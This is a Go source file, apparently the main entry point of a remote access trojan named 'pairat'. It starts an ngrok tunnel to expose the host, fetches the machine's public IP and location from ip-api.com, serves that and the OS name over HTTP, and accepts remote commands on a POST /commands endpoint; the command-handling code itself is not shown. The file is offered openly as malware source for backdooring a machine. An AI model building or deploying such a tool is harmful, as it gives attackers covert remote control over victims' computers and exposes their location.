package main

import (
	"io/ioutil"
	"log"
	"net/http"
	"runtime"

	"github.com/ELPanaJose/pairat/routes"
	"github.com/ELPanaJose/pairat/utils"
	"github.com/labstack/echo"
	"github.com/labstack/echo/middleware"
)

func main() {
	// detect the OS
	utils.DetecOS()
	// execute ngrok
	utils.Ngrok()
	// Echo instance
	e := echo.New()

	// Middleware
	e.Use(middleware.Logger())
	e.Use(middleware.Recover())

	// Routes

	e.GET("/", func(c echo.Context) error {
		c.String(http.StatusOK, "💀")
		return nil
	})

	resp, err := http.Get("http://ip-api.com/json")
	if err != nil {
		log.Fatalln(err)
	}
	//We Read the response body on the line below.
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		log.Fatalln(err)
	}
	//Convert the body to type string
	sb := string(body)
	// send the ip info
	e.GET("/ip", func(c echo.Context) error {
		c.String(http.StatusOK, sb)
		return nil
	})
	// send the ip
	e.GET("/ip/os", func(c echo.Context) error {
		c.String(http.StatusOK, runtime.GOOS)
		return nil
	})

	e.POST("/commands", routes.UploadCommand)

	// Start server
	e.Logger.Fatal(e.Start(":1323"))
}
